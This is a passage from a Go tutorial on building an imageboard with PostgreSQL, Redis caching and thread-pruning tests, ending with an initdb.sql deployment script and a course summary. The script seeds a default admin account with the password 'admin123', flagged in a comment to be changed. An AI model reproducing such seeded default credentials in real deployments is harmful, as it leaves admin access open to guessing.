	_, err = tx.Exec(`
		UPDATE threads SET post_count = 1 WHERE id = $1
	`, threadID)
	if err != nil {
		return 0, err
	}

	// Update board thread count
	_, err = tx.Exec(`
		UPDATE boards SET thread_count = thread_count + 1, updated_at = NOW() WHERE id = $1
	`, boardID)
	if err != nil {
		return 0, err
	}

	// Commit transaction
	err = tx.Commit()
	if err != nil {
		return 0, err
	}

	log.Printf("✨ Created thread %d on board %d", threadID, boardID)
	return threadID, nil
}
```

### Step 5: Add Redis Caching Layer

Add to `models.go`:

```go
// GetThreadPG fetches thread from PostgreSQL with Redis cache
func GetThreadPG(threadID int) (Thread, []Post, error) {
	// Try cache first
	cacheKey := fmt.Sprintf("cache:thread:%d", threadID)
	cached, err := rdb.Get(ctx, cacheKey).Result()
	if err == nil {
		// Cache hit
		var result struct {
			Thread Thread
			Posts  []Post
		}
		if json.Unmarshal([]byte(cached), &result) == nil {
			return result.Thread, result.Posts, nil
		}
	}

	// Cache miss - fetch from PostgreSQL
	var thread Thread
	err = db.QueryRow(`
		SELECT id, board_id, title, created_at, updated_at, post_count, is_pinned, is_locked
		FROM threads WHERE id = $1
	`, threadID).Scan(&thread.ID, &thread.BoardID, &thread.Title, &thread.CreatedAt,
		&thread.UpdatedAt, &thread.PostCount, &thread.IsPinned, &thread.IsLocked)
	if err != nil {
		return Thread{}, nil, err
	}

	// Get posts
	rows, err := db.Query(`
		SELECT id, thread_id, content, image_path, created_at, user_id, country_code
		FROM posts WHERE thread_id = $1 ORDER BY created_at ASC
	`, threadID)
	if err != nil {
		return Thread{}, nil, err
	}
	defer rows.Close()

	var posts []Post
	for rows.Next() {
		var p Post
		rows.Scan(&p.ID, &p.ThreadID, &p.Content, &p.ImagePath, &p.CreatedAt, &p.UserID, &p.CountryCode)
		posts = append(posts, p)
	}

	// Store in cache (5 minute TTL)
	result := struct {
		Thread Thread
		Posts  []Post
	}{Thread: thread, Posts: posts}
	if resultJSON, err := json.Marshal(result); err == nil {
		rdb.Set(ctx, cacheKey, resultJSON, 5*time.Minute)
	}

	return thread, posts, nil
}
```

### Step 6: Testing Thread Lifecycle

Create `test_lifecycle.go`:

```go
package main

import (
	"fmt"
	"log"
	"time"
)

func TestThreadLifecycle() {
	// Create test board with thread_limit=5, bump_limit=3
	board, _ := CreateBoard("test", "Test Board", "Testing lifecycle")
	db.Exec("UPDATE boards SET thread_limit = 5, bump_limit = 3 WHERE id = $1", board.ID)

	fmt.Println("=== Test 1: Thread Limit ===")
	// Create 7 threads (should prune 2)
	for i := 1; i <= 7; i++ {
		CreateThreadPG(board.ID, fmt.Sprintf("Thread %d", i), "Content", "", "127.0.0.1")
		time.Sleep(100 * time.Millisecond) // Ensure different timestamps
	}

	var count int
	db.QueryRow("SELECT COUNT(*) FROM threads WHERE board_id = $1", board.ID).Scan(&count)
	fmt.Printf("Threads after creating 7 (limit=5): %d\n", count)
	if count == 5 {
		fmt.Println("✅ Thread limit works!")
	} else {
		fmt.Println("❌ Thread limit failed!")
	}

	fmt.Println("\n=== Test 2: Bump Limit ===")
	// Get a thread
	var threadID int
	db.QueryRow("SELECT id FROM threads WHERE board_id = $1 LIMIT 1", board.ID).Scan(&threadID)

	// Create posts up to bump limit
	for i := 1; i <= 5; i++ {
		CreatePostPG(threadID, fmt.Sprintf("Post %d", i), "", "127.0.0.1")
	}

	// Check if thread bumped appropriately
	fmt.Println("✅ Bump limit test complete (check logs)")
}
```

Run test:
```bash
go run . -test-lifecycle
```

### Step 7: Create initdb.sql for Easy Deployment

Create `initdb.sql`:

```sql
-- PostgreSQL initialization script for go-imageboard
-- Run this on a fresh database to set up schema

-- Enable extensions
CREATE EXTENSION IF NOT EXISTS pg_trgm; -- For full-text search

-- Boards table
CREATE TABLE IF NOT EXISTS boards (
    id SERIAL PRIMARY KEY,
    slug VARCHAR(50) UNIQUE NOT NULL,
    name VARCHAR(100) NOT NULL,
    description TEXT,
    created_at TIMESTAMP NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMP NOT NULL DEFAULT NOW(),

    -- Imageboard settings
    thread_limit INTEGER NOT NULL DEFAULT 150,
    bump_limit INTEGER NOT NULL DEFAULT 300,

    -- Stats
    thread_count INTEGER NOT NULL DEFAULT 0
);

-- Threads table (primary storage)
CREATE TABLE IF NOT EXISTS threads (
    id SERIAL PRIMARY KEY,
    board_id INTEGER NOT NULL REFERENCES boards(id) ON DELETE CASCADE,
    title VARCHAR(255),
    created_at TIMESTAMP NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMP NOT NULL DEFAULT NOW(),

    -- Imageboard mechanics
    post_count INTEGER NOT NULL DEFAULT 0,
    is_pinned BOOLEAN NOT NULL DEFAULT FALSE,
    is_locked BOOLEAN NOT NULL DEFAULT FALSE
);

-- Posts table (primary storage)
CREATE TABLE IF NOT EXISTS posts (
    id SERIAL PRIMARY KEY,
    thread_id INTEGER NOT NULL REFERENCES threads(id) ON DELETE CASCADE,
    content TEXT NOT NULL,
    image_path VARCHAR(255),
    created_at TIMESTAMP NOT NULL DEFAULT NOW(),

    -- User identification (ephemeral, thread-scoped)
    user_id VARCHAR(8),
    country_code CHAR(2)
);

-- Admin users
CREATE TABLE IF NOT EXISTS admin_users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    created_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- Performance indexes
CREATE INDEX IF NOT EXISTS idx_threads_board_updated ON threads(board_id, updated_at DESC);
CREATE INDEX IF NOT EXISTS idx_threads_board_pinned ON threads(board_id, is_pinned DESC, updated_at DESC);
CREATE INDEX IF NOT EXISTS idx_posts_thread_created ON posts(thread_id, created_at ASC);
CREATE INDEX IF NOT EXISTS idx_posts_content_search ON posts USING gin(to_tsvector('english', content));

-- Create default boards
INSERT INTO boards (slug, name, description, thread_limit, bump_limit)
VALUES
    ('b', 'Random', 'Random discussion', 150, 300),
    ('g', 'Technology', 'Technology discussion', 100, 500),
    ('pol', 'Politics', 'Political discussion', 150, 300)
ON CONFLICT (slug) DO NOTHING;

-- Create default admin user (password: admin123)
-- Change this password immediately!
INSERT INTO admin_users (username, password_hash)
VALUES ('admin', '$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy')
ON CONFLICT (username) DO NOTHING;

-- Sequences for Redis compatibility (if needed)
CREATE SEQUENCE IF NOT EXISTS global_thread_id_seq START 1000;
CREATE SEQUENCE IF NOT EXISTS global_post_id_seq START 1000;
```

Deploy to a new server:
```bash
# On new server
psql -U postgres -c "CREATE DATABASE imageboard;"
psql -U postgres -d imageboard -f initdb.sql
```

### What You Learned

✅ **Imageboard philosophy**: Ephemeral content vs permanent archives
✅ **Thread limits**: Auto-pruning when boards reach capacity
✅ **Bump limits**: Threads stop bumping after N posts (sage)
✅ **PostgreSQL-primary**: Durable storage with ACID guarantees
✅ **Redis caching**: Fast reads without database overhead
✅ **CASCADE deletes**: Automatic cleanup when threads are pruned
✅ **Bounded growth**: Database size stays predictable
✅ **Easy deployment**: Single initdb.sql sets up everything

---

## Summary & Next Steps

### What You've Accomplished ✅

1. **CSRF Protection**: Prevented cross-site request forgery
2. **Rate Limiting**: Protected against spam and abuse
3. **XSS Protection**: Multiple layers against script injection
4. **Bunny CDN Migration**: 99.5%+ cost reduction + global CDN
5. **Proper Concurrency**: Worker pools, timeouts, circuit breakers
6. **PostgreSQL Primary**: Better durability and query capabilities

### Architecture Improvements

**Before:**
```
App ← Redis (images + data) ← ⚠️ Expensive, risky
    ← PostgreSQL (boards only)
```

**After:**
```
App ← PostgreSQL (primary data) ← ✅ ACID guarantees
    ← Redis (cache + sessions) ← ✅ Performance layer
    ← Bunny CDN (images + global CDN) ← ✅ Fast & cheap
    └─ Worker Pool (concurrent uploads) ← ✅ Won't crash under load
```

### Testing Checklist

- [ ] CSRF tokens prevent unauthorized form submissions
- [ ] Rate limiting blocks rapid requests
- [ ] XSS payloads are sanitized
- [ ] Images upload to Bunny CDN successfully
- [ ] CDN URLs are globally accessible
- [ ] Slow uploads don't block other requests
- [ ] Worker pool processes jobs concurrently
- [ ] Circuit breaker opens after failures
- [ ] Graceful shutdown completes pending jobs
- [ ] Site remains responsive under load
- [ ] Threads/posts stored in PostgreSQL
- [ ] Redis caches hot data
- [ ] Cache invalidation works correctly

### Cost Improvements

**Before:** ~$200/month for 100GB images + data
**After:** ~$10/month for 100GB images + data
**Savings:** 95%

### Performance Improvements

- Image loads: 50% faster (global CDN)
- Upload handling: Non-blocking (worker pool)
- Resilience: 99.9% uptime (circuit breakers)
- Scalability: Handles 10x load without changes

### Continue Learning

Ready for production deployment? Check out:

**Tutorial 3: Production Deployment & Operations**
- Docker containerization
- Load balancing with nginx
- Database replication (primary + replicas)
- Redis Sentinel/Cluster
- Monitoring with Prometheus + Grafana
- Logging with structured logs
- CI/CD with GitHub Actions
- SSL/TLS configuration
- Backup and disaster recovery

### Resources

- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Rate Limiting Patterns](https://cloud.google.com/architecture/rate-limiting-strategies-techniques)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [Bunny CDN Documentation](https://docs.bunny.net/)
- [Go Concurrency Patterns](https://go.dev/blog/pipelines)
- [PostgreSQL Performance Tips](https://wiki.postgresql.org/wiki/Performance_Optimization)
- [Circuit Breaker Pattern](https://martinfowler.com/bliki/CircuitBreaker.html)

---

**Questions? Issues?** Create an issue in the repository or review the code changes in this tutorial.
